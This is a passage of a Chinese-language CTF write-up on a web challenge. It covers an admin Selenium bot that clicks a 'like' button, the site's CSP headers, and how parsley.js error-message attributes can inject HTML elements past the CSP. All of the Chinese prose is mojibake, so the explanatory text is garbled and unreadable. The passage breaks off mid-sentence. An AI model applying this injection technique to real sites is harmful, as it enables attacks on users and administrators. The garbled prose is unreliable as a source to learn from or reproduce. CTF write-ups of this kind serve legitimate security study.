<h6 id="æ—¢ç„¶æœ‰æäº¤ä»£ç ç»™adminçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯æœ‰å¯èƒ½æ˜¯ä¸€ä¸ªxssæˆ–è€…ä»€ä¹ˆçš„ï¼Ÿ"><a href="#æ—¢ç„¶æœ‰æäº¤ä»£ç ç»™adminçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯æœ‰å¯èƒ½æ˜¯ä¸€ä¸ªxssæˆ–è€…ä»€ä¹ˆçš„ï¼Ÿ" class="headerlink" title="æ—¢ç„¶æœ‰æäº¤ä»£ç ç»™adminçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯æœ‰å¯èƒ½æ˜¯ä¸€ä¸ªxssæˆ–è€…ä»€ä¹ˆçš„ï¼Ÿ"></a>æ—¢ç„¶æœ‰æäº¤ä»£ç ç»™adminçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯æœ‰å¯èƒ½æ˜¯ä¸€ä¸ªxssæˆ–è€…ä»€ä¹ˆçš„ï¼Ÿ</h6><h6 id="æˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°adminåœ¨æ”¶åˆ°writeupåçš„ä¸»è¦æ“ä½œï¼š"><a href="#æˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°adminåœ¨æ”¶åˆ°writeupåçš„ä¸»è¦æ“ä½œï¼š" class="headerlink" title="æˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°adminåœ¨æ”¶åˆ°writeupåçš„ä¸»è¦æ“ä½œï¼š"></a>æˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°adminåœ¨æ”¶åˆ°writeupåçš„ä¸»è¦æ“ä½œï¼š</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>, <span class="number">600</span>))</span><br><span class="line">display.start()</span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="string">'--disable-gpu'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">'--no-sandbox'</span>)</span><br><span class="line">driver = webdriver.Chrome(<span class="string">'/usr/bin/chromedriver'</span>, options=chrome_options)</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://admin:__ADMIN_TOKEN__@127.0.0.1/login_admin.php?id='</span>+writeup_id</span><br><span class="line">driver.get(url)</span><br><span class="line">element = driver.find_element_by_xpath(<span class="string">'//input[@id="like"]'</span>)</span><br><span class="line">element.click()</span><br><span class="line"></span><br><span class="line">driver.quit()</span><br><span class="line">display.stop()</span><br></pre></td></tr></table></figure>

<h6 id="æˆ‘ä»¬å¯ä»¥çœ‹åˆ°adminåœ¨è¿›è¡Œç™»é™†ä¹‹åä½¿ç”¨find-element-by-xpathæ‰¾åˆ°äº†idä¸ºlikeçš„inputæ ‡ç­¾ï¼Œå¹¶è¿›è¡Œäº†ç‚¹å‡»ï¼Œä¹Ÿå°±æ˜¯æäº¤ç»™adminçš„writeupåï¼Œadminä¼šæµè§ˆè¿›è¡Œç‚¹å‡»ï¼Œå‘é€ä¸€ä¸ªç‚¹èµè¯·æ±‚"><a href="#æˆ‘ä»¬å¯ä»¥çœ‹åˆ°adminåœ¨è¿›è¡Œç™»é™†ä¹‹åä½¿ç”¨find-element-by-xpathæ‰¾åˆ°äº†idä¸ºlikeçš„inputæ ‡ç­¾ï¼Œå¹¶è¿›è¡Œäº†ç‚¹å‡»ï¼Œä¹Ÿå°±æ˜¯æäº¤ç»™adminçš„writeupåï¼Œadminä¼šæµè§ˆè¿›è¡Œç‚¹å‡»ï¼Œå‘é€ä¸€ä¸ªç‚¹èµè¯·æ±‚" class="headerlink" title="æˆ‘ä»¬å¯ä»¥çœ‹åˆ°adminåœ¨è¿›è¡Œç™»é™†ä¹‹åä½¿ç”¨find_element_by_xpathæ‰¾åˆ°äº†idä¸ºlikeçš„inputæ ‡ç­¾ï¼Œå¹¶è¿›è¡Œäº†ç‚¹å‡»ï¼Œä¹Ÿå°±æ˜¯æäº¤ç»™adminçš„writeupåï¼Œadminä¼šæµè§ˆè¿›è¡Œç‚¹å‡»ï¼Œå‘é€ä¸€ä¸ªç‚¹èµè¯·æ±‚"></a>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°adminåœ¨è¿›è¡Œç™»é™†ä¹‹åä½¿ç”¨<code>find_element_by_xpath</code>æ‰¾åˆ°äº†idä¸ºlikeçš„inputæ ‡ç­¾ï¼Œå¹¶è¿›è¡Œäº†ç‚¹å‡»ï¼Œä¹Ÿå°±æ˜¯æäº¤ç»™adminçš„writeupåï¼Œadminä¼šæµè§ˆè¿›è¡Œç‚¹å‡»ï¼Œå‘é€ä¸€ä¸ªç‚¹èµè¯·æ±‚</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"/like.php"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"c"</span> <span class="attr">value</span>=<span class="string">"&lt;?= $_SESSION['c'] ?&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">value</span>=<span class="string">"&lt;?= $writeup['id'] ?&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"like"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"ğŸ‘"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹general-phpä¸­çš„é˜²å¾¡æªæ–½"><a href="#æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹general-phpä¸­çš„é˜²å¾¡æªæ–½" class="headerlink" title="æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹general.phpä¸­çš„é˜²å¾¡æªæ–½"></a>æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹general.phpä¸­çš„é˜²å¾¡æªæ–½</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start([<span class="string">'cookie_httponly'</span> =&gt; <span class="keyword">true</span>, <span class="string">'cookie_samesite'</span> =&gt; <span class="string">'Strict'</span>]);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bin2hex(random_bytes(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$nonce = base64_encode(id());</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">header(<span class="string">'x-xss-protection: 1; mode=block'</span>);</span><br><span class="line">header(<span class="string">'X-Content-Type-Options: nosniff'</span>);</span><br><span class="line">header(<span class="string">'x-frame-options: DENY'</span>);</span><br><span class="line">header(<span class="string">'Referrer-Policy: no-referrer'</span>);</span><br><span class="line">header(<span class="string">"Feature-Policy: geolocation 'none'; midi 'none'; sync-xhr 'none'; microphone 'none'; camera 'none'; magnetometer 'none'; gyroscope 'none'; speaker 'none'; fullscreen 'none'; payment 'none'; usb 'none'; vr 'none'; encrypted-media 'none'"</span>);</span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'none'; script-src 'nonce-"</span>.$nonce.<span class="string">"' https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; require-sri-for script style;"</span>);</span><br></pre></td></tr></table></figure>

<h6 id="è€Œscript-srcè®¾ç½®çš„nonceåªèƒ½åœ¨header-phpä½¿ç”¨äº†ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ‹¿ä¸åˆ°è¿™ä¸ªnonce"><a href="#è€Œscript-srcè®¾ç½®çš„nonceåªèƒ½åœ¨header-phpä½¿ç”¨äº†ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ‹¿ä¸åˆ°è¿™ä¸ªnonce" class="headerlink" title="è€Œscript-srcè®¾ç½®çš„nonceåªèƒ½åœ¨header.phpä½¿ç”¨äº†ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ‹¿ä¸åˆ°è¿™ä¸ªnonce"></a>è€Œ<code>script-src</code>è®¾ç½®çš„nonceåªèƒ½åœ¨header.phpä½¿ç”¨äº†ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ‹¿ä¸åˆ°è¿™ä¸ªnonce</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"&lt;?=$nonce?&gt;"</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#publish-form'</span>).parsley() <span class="comment">// prevent hacking</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="æ‰€ä»¥æˆ‘ä»¬å¯èƒ½éœ€è¦å¾€ç‚¹å‡»äº‹ä»¶é‚£ä¸€æ–¹é¢æ€è€ƒï¼Œå¹¶ä¸”åˆ©ç”¨é¢˜ç›®å¼•å…¥çš„ä¸¤ä¸ª-js-æ–‡ä»¶å…¥æ‰‹ï¼Œä¸€ä¸ª-jquery-js-ï¼Œå¦ä¸€ä¸ª-parsley-jsã€‚"><a href="#æ‰€ä»¥æˆ‘ä»¬å¯èƒ½éœ€è¦å¾€ç‚¹å‡»äº‹ä»¶é‚£ä¸€æ–¹é¢æ€è€ƒï¼Œå¹¶ä¸”åˆ©ç”¨é¢˜ç›®å¼•å…¥çš„ä¸¤ä¸ª-js-æ–‡ä»¶å…¥æ‰‹ï¼Œä¸€ä¸ª-jquery-js-ï¼Œå¦ä¸€ä¸ª-parsley-jsã€‚" class="headerlink" title="æ‰€ä»¥æˆ‘ä»¬å¯èƒ½éœ€è¦å¾€ç‚¹å‡»äº‹ä»¶é‚£ä¸€æ–¹é¢æ€è€ƒï¼Œå¹¶ä¸”åˆ©ç”¨é¢˜ç›®å¼•å…¥çš„ä¸¤ä¸ª js æ–‡ä»¶å…¥æ‰‹ï¼Œä¸€ä¸ª jquery.js ï¼Œå¦ä¸€ä¸ª parsley.jsã€‚"></a>æ‰€ä»¥æˆ‘ä»¬å¯èƒ½éœ€è¦å¾€ç‚¹å‡»äº‹ä»¶é‚£ä¸€æ–¹é¢æ€è€ƒï¼Œå¹¶ä¸”åˆ©ç”¨é¢˜ç›®å¼•å…¥çš„ä¸¤ä¸ª js æ–‡ä»¶å…¥æ‰‹ï¼Œä¸€ä¸ª jquery.js ï¼Œå¦ä¸€ä¸ª parsley.jsã€‚</h6><h6 id="Parsley-js"><a href="#Parsley-js" class="headerlink" title="Parsley.js"></a>Parsley.js</h6><h6 id="æˆ‘ä»¬å¯ä»¥å»parsley-js-docçœ‹åˆ°è¯¥libçš„ç®€å•è¯´æ˜ä»¥åŠä½¿ç”¨ï¼š"><a href="#æˆ‘ä»¬å¯ä»¥å»parsley-js-docçœ‹åˆ°è¯¥libçš„ç®€å•è¯´æ˜ä»¥åŠä½¿ç”¨ï¼š" class="headerlink" title="æˆ‘ä»¬å¯ä»¥å»parsley.js docçœ‹åˆ°è¯¥libçš„ç®€å•è¯´æ˜ä»¥åŠä½¿ç”¨ï¼š"></a>æˆ‘ä»¬å¯ä»¥å»<a href="https://parsleyjs.org/doc/index.html" target="_blank" rel="noopener">parsley.js doc</a>çœ‹åˆ°è¯¥libçš„ç®€å•è¯´æ˜ä»¥åŠä½¿ç”¨ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Parsley is a javascript form validation library. It helps you provide your users with feedback on their form submission before sending it to your server. It saves you bandwidth, server load and it saves time for your users.</span><br><span class="line"></span><br><span class="line">Javascript form validation is not necessary, and if used, it does not replace strong backend server validation.</span><br><span class="line"></span><br><span class="line">Thatâ€™s why Parsley is here: to let you define your general form validation, implement it on the backend side, and simply port it frontend-side, with maximum respect to user experience best practices.</span><br></pre></td></tr></table></figure>

<h6 id="å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸ªç®€å•çš„å‰ç«¯éªŒè¯åº“ï¼Œç®€å•æŸ¥ä¸€ä¸‹æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰å‡ ä¸ªæœ‰æ„æ€çš„-APIï¼š"><a href="#å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸ªç®€å•çš„å‰ç«¯éªŒè¯åº“ï¼Œç®€å•æŸ¥ä¸€ä¸‹æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰å‡ ä¸ªæœ‰æ„æ€çš„-APIï¼š" class="headerlink" title="å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸ªç®€å•çš„å‰ç«¯éªŒè¯åº“ï¼Œç®€å•æŸ¥ä¸€ä¸‹æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰å‡ ä¸ªæœ‰æ„æ€çš„ APIï¼š"></a>å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸ªç®€å•çš„å‰ç«¯éªŒè¯åº“ï¼Œç®€å•æŸ¥ä¸€ä¸‹æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰å‡ ä¸ªæœ‰æ„æ€çš„ APIï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data-parsley-trigger=â€inputâ€</span><br><span class="line"></span><br><span class="line">Specify one or many javascript events that will trigger item validation, before any failure. To set multiple events, separate them with a space data-parsley-trigger=â€focusin focusoutâ€. Default is null. See the various events supported by jQuery.</span><br><span class="line"></span><br><span class="line">data-parsley-error-message=â€my messageâ€</span><br><span class="line"></span><br><span class="line">Customize a unique global message for the field.</span><br><span class="line"></span><br><span class="line">data-parsley-errors-container=â€#elementâ€</span><br><span class="line"></span><br><span class="line">Specify the existing DOM container where ParsleyUI should put the errors. It is also possible to configure it with a callback function from javascript, see the annotated source.</span><br></pre></td></tr></table></figure>

<h6 id="æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨data-parsley-triggerè®¾ç½®æˆ‘ä»¬çš„è§¦å‘æ–¹å¼ï¼Œä½¿ç”¨data-parsley-error-messageæ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œä½¿ç”¨data-parsley-errors-containeræ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„æ˜¾ç¤ºé”™è¯¯çš„ä½ç½®ã€‚"><a href="#æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨data-parsley-triggerè®¾ç½®æˆ‘ä»¬çš„è§¦å‘æ–¹å¼ï¼Œä½¿ç”¨data-parsley-error-messageæ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œä½¿ç”¨data-parsley-errors-containeræ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„æ˜¾ç¤ºé”™è¯¯çš„ä½ç½®ã€‚" class="headerlink" title="æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨data-parsley-triggerè®¾ç½®æˆ‘ä»¬çš„è§¦å‘æ–¹å¼ï¼Œä½¿ç”¨data-parsley-error-messageæ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œä½¿ç”¨data-parsley-errors-containeræ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„æ˜¾ç¤ºé”™è¯¯çš„ä½ç½®ã€‚"></a>æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>data-parsley-trigger</code>è®¾ç½®æˆ‘ä»¬çš„è§¦å‘æ–¹å¼ï¼Œä½¿ç”¨<code>data-parsley-error-message</code>æ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œä½¿ç”¨<code>data-parsley-errors-container</code>æ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„æ˜¾ç¤ºé”™è¯¯çš„ä½ç½®ã€‚</h6><h6 id="æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•ç”¨ä¸€ä¸ªdata-parsley-validateæŒ‡å®šæˆ‘ä»¬éœ€è¦éªŒè¯çš„è¡¨å•ï¼Œç„¶ååˆ©ç”¨é”™è¯¯ä¿¡æ¯æŠŠå…ƒç´ æ ‡ç­¾è¾“å‡ºå‡ºæ¥ï¼Œå¹¶ä¸”æˆ‘ä»¬æ¥ç€è¿˜å¯ä»¥åˆ©ç”¨æŒ‡å®šè¾“å‡ºä½ç½®æ¥æ§åˆ¶è¾“å‡ºï¼Œä¾‹å¦‚ï¼š"><a href="#æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•ç”¨ä¸€ä¸ªdata-parsley-validateæŒ‡å®šæˆ‘ä»¬éœ€è¦éªŒè¯çš„è¡¨å•ï¼Œç„¶ååˆ©ç”¨é”™è¯¯ä¿¡æ¯æŠŠå…ƒç´ æ ‡ç­¾è¾“å‡ºå‡ºæ¥ï¼Œå¹¶ä¸”æˆ‘ä»¬æ¥ç€è¿˜å¯ä»¥åˆ©ç”¨æŒ‡å®šè¾“å‡ºä½ç½®æ¥æ§åˆ¶è¾“å‡ºï¼Œä¾‹å¦‚ï¼š" class="headerlink" title="æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•ç”¨ä¸€ä¸ªdata-parsley-validateæŒ‡å®šæˆ‘ä»¬éœ€è¦éªŒè¯çš„è¡¨å•ï¼Œç„¶ååˆ©ç”¨é”™è¯¯ä¿¡æ¯æŠŠå…ƒç´ æ ‡ç­¾è¾“å‡ºå‡ºæ¥ï¼Œå¹¶ä¸”æˆ‘ä»¬æ¥ç€è¿˜å¯ä»¥åˆ©ç”¨æŒ‡å®šè¾“å‡ºä½ç½®æ¥æ§åˆ¶è¾“å‡ºï¼Œä¾‹å¦‚ï¼š"></a>æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•ç”¨ä¸€ä¸ª<code>data-parsley-validate</code>æŒ‡å®šæˆ‘ä»¬éœ€è¦éªŒè¯çš„è¡¨å•ï¼Œç„¶ååˆ©ç”¨é”™è¯¯ä¿¡æ¯æŠŠå…ƒç´ æ ‡ç­¾è¾“å‡ºå‡ºæ¥ï¼Œå¹¶ä¸”æˆ‘ä»¬æ¥ç€è¿˜å¯ä»¥åˆ©ç”¨æŒ‡å®šè¾“å‡ºä½ç½®æ¥æ§åˆ¶è¾“å‡ºï¼Œä¾‹å¦‚ï¼š</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">data-parsley-trigger</span>=<span class="string">"blur"</span> <span class="attr">autofocus</span> <span class="attr">name</span>=<span class="string">"some-field"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">data-parsley-error-message</span>=<span class="string">"&lt;input id=like type=button value=padyload&gt;"</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">data-parsley-required</span></span></span><br><span class="line"><span class="tag">            <span class="attr">data-parsley-errors-container</span>=<span class="string">"#div1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="data-parsley-triggeræŒ‡å®šäº†bluräº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬çš„-input-å¤±ç„¦æ—¶ï¼Œä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨-id-ä¸º-div1-çš„å…ƒç´ ä¸­æ˜¾ç¤ºï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œæµè§ˆå™¨ä¹Ÿå°†å…¶è¿›è¡Œäº†æ¸²æŸ“ã€‚"><a href="#data-parsley-triggeræŒ‡å®šäº†bluräº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬çš„-input-å¤±ç„¦æ—¶ï¼Œä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨-id-ä¸º-div1-çš„å…ƒç´ ä¸­æ˜¾ç¤ºï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œæµè§ˆå™¨ä¹Ÿå°†å…¶è¿›è¡Œäº†æ¸²æŸ“ã€‚" class="headerlink" title="data-parsley-triggeræŒ‡å®šäº†bluräº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬çš„ input å¤±ç„¦æ—¶ï¼Œä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨ id ä¸º div1 çš„å…ƒç´ ä¸­æ˜¾ç¤ºï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œæµè§ˆå™¨ä¹Ÿå°†å…¶è¿›è¡Œäº†æ¸²æŸ“ã€‚"></a><code>data-parsley-trigger</code>æŒ‡å®šäº†<code>blur</code>äº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬çš„ input å¤±ç„¦æ—¶ï¼Œä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨ id ä¸º div1 çš„å…ƒç´ ä¸­æ˜¾ç¤ºï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œæµè§ˆå™¨ä¹Ÿå°†å…¶è¿›è¡Œäº†æ¸²æŸ“ã€‚</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-10.png" alt></p>
<h6 id="Click"><a href="#Click" class="headerlink" title="Click"></a>Click</h6><h6 id="å›åˆ°é¢˜ç›®å½“ä¸­ï¼Œadmin-æ‰€åšçš„åŠ¨ä½œæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªå°±æ˜¯ç™»å½•ï¼Œæ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¯¹è¿™ä¸ªæ“ä½œæ²¡åŠæ³•è¿›è¡Œä»€ä¹ˆå¹²æ‰°ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯ç‚¹èµäº†ï¼Œæ›´å…·ä½“æ¥è¯´å°±æ˜¯é€šè¿‡-show-php-æ‰“å¼€ä½ çš„-writeup-å†…å®¹ï¼Œå¹¶ä¸”ç‚¹å‡»é¡µé¢ä¸Š-id-ä¸º-like-çš„-input-æ ‡ç­¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´å¯èƒ½çš„äº‹å¯¹ç‚¹èµæ“ä½œè¿›è¡Œä¸€ä¸ªå¹²æ‰°æˆ–è€…å…¶ä»–çš„æ“ä½œï¼Œå¹¶ä¸”æ ¹æ®å®é™…æµ‹è¯•ï¼Œé€šè¿‡selenium-webdriverè°ƒç”¨find-element-by-xpathå‡½æ•°å¾—åˆ°çš„-id-ä¸º-like-çš„-input-å…ƒç´ åªèƒ½æœ‰ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿æˆ‘ä»¬åœ¨-writeup-å†…å®¹ä¸­æ’å…¥ä¸€ä¸ª-id-ä¸º-like-çš„-input-æ ‡ç­¾ï¼Œadmin-ä¹Ÿåªä¼šæ ¹æ®é¡µé¢é¡ºåºæ‹¿åˆ°ç¬¬ä¸€ä¸ªç‚¹èµ-input-ã€‚"><a href="#å›åˆ°é¢˜ç›®å½“ä¸­ï¼Œadmin-æ‰€åšçš„åŠ¨ä½œæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªå°±æ˜¯ç™»å½•ï¼Œæ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¯¹è¿™ä¸ªæ“ä½œæ²¡åŠæ³•è¿›è¡Œä»€ä¹ˆå¹²æ‰°ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯ç‚¹èµäº†ï¼Œæ›´å…·ä½“æ¥è¯´å°±æ˜¯é€šè¿‡-show-php-æ‰“å¼€ä½ çš„-writeup-å†…å®¹ï¼Œå¹¶ä¸”ç‚¹å‡»é¡µé¢ä¸Š-id-ä¸º-like-çš„-input-æ ‡ç­¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´å¯èƒ½çš„äº‹å¯¹ç‚¹èµæ“ä½œè¿›è¡Œä¸€ä¸ªå¹²æ‰°æˆ–è€…å…¶ä»–çš„æ“ä½œï¼Œå¹¶ä¸”æ ¹æ®å®é™…æµ‹è¯•ï¼Œé€šè¿‡selenium-webdriverè°ƒç”¨find-element-by-xpathå‡½æ•°å¾—åˆ°çš„-id-ä¸º-like-çš„-input-å…ƒç´ åªèƒ½æœ‰ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿æˆ‘ä»¬åœ¨-writeup-å†…å®¹ä¸­æ’å…¥ä¸€ä¸ª-id-ä¸º-like-çš„-input-æ ‡ç­¾ï¼Œadmin-ä¹Ÿåªä¼šæ ¹æ®é¡µé¢é¡ºåºæ‹¿åˆ°ç¬¬ä¸€ä¸ªç‚¹èµ-input-ã€‚" class="headerlink" title="å›åˆ°é¢˜ç›®å½“ä¸­ï¼Œadmin æ‰€åšçš„åŠ¨ä½œæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªå°±æ˜¯ç™»å½•ï¼Œæ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¯¹è¿™ä¸ªæ“ä½œæ²¡åŠæ³•è¿›è¡Œä»€ä¹ˆå¹²æ‰°ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯ç‚¹èµäº†ï¼Œæ›´å…·ä½“æ¥è¯´å°±æ˜¯é€šè¿‡ show.php æ‰“å¼€ä½ çš„ writeup å†…å®¹ï¼Œå¹¶ä¸”ç‚¹å‡»é¡µé¢ä¸Š id ä¸º like çš„ input æ ‡ç­¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´å¯èƒ½çš„äº‹å¯¹ç‚¹èµæ“ä½œè¿›è¡Œä¸€ä¸ªå¹²æ‰°æˆ–è€…å…¶ä»–çš„æ“ä½œï¼Œå¹¶ä¸”æ ¹æ®å®é™…æµ‹è¯•ï¼Œé€šè¿‡selenium.webdriverè°ƒç”¨find_element_by_xpathå‡½æ•°å¾—åˆ°çš„ id ä¸º like çš„ input å…ƒç´ åªèƒ½æœ‰ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿æˆ‘ä»¬åœ¨ writeup å†…å®¹ä¸­æ’å…¥ä¸€ä¸ª id ä¸º like çš„ input æ ‡ç­¾ï¼Œadmin ä¹Ÿåªä¼šæ 